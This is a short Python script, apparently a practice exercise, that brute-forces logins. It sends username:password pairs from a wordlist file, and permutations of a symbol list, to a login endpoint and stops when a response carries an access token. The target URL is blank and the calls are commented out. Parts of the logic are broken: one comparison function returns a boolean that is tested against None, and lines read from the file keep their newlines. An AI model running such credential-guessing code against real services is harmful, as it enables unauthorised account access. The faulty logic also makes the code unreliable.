import requests
import argparse


def request_and_check(url, login, password):
    r = requests.post(url, json={
        "login":login,
        "password": password
    })
    if r.json()['access_token'] != None:
        return f"{login}:{password}"
    return None

def with_password(line, password):
    return line == password

def symbol_array_algorithm(a):
    #using Narayan algorithm
    n = len(a)
    while True:

        j = n - 2
        while j >= 0 and a[j] > a[j + 1]:
            j -= 1

        i = n - 1
        while i > j and a[j] > a[i]:
            i -= 1

        a[i], a[j] = a[j], a[i]
        a[j + 1:] = a[j + 1:][::-1]

        yield a

def by_dict_net(url, file):
    with open(file, "r") as f:
        for line in f.readlines():
            data = request_and_check(url, line.split(":")[0], line.split(":")[1])
            if data != None:
                return line

def by_dict_with_pass(file, password):
    with open(file, "r") as f:
        for line in f.readlines():
            if with_password(line.split(":")[1], password):
                return line

def by_symbol_array_net(login, symbols, url):
    a = symbols.split()
    tmp = a.copy()
    for frase in symbol_array_algorithm(a):
        data = request_and_check(url, login, ' '.join(frase))
        if data != None:
            return ' '.join(frase)
        if tmp == a:
            break

def by_symbol_array_with_pass(symbols, password):
    a = symbols.split()
    tmp = a.copy()
    for frase in symbol_array_algorithm(a):
        data = with_password(' '.join(frase), password)
        if data != None:
            return ' '.join(frase)
        if tmp == a:
            break

def main():
    password = "ijijesd"

    url = ""
    dict_path = "pass.txt"

    login = ""
    symbols = "3 1 5 6 7dfsdd 8 t $sdffds 2 r R eW f g"

    #by_dict_net(url, dict_path)
    #print(by_dict_with_pass(dict_path, password))

    #by_symbol_array_net(login, symbols, url)
    #by_symbol_array_with_pass(symbols, password)

main()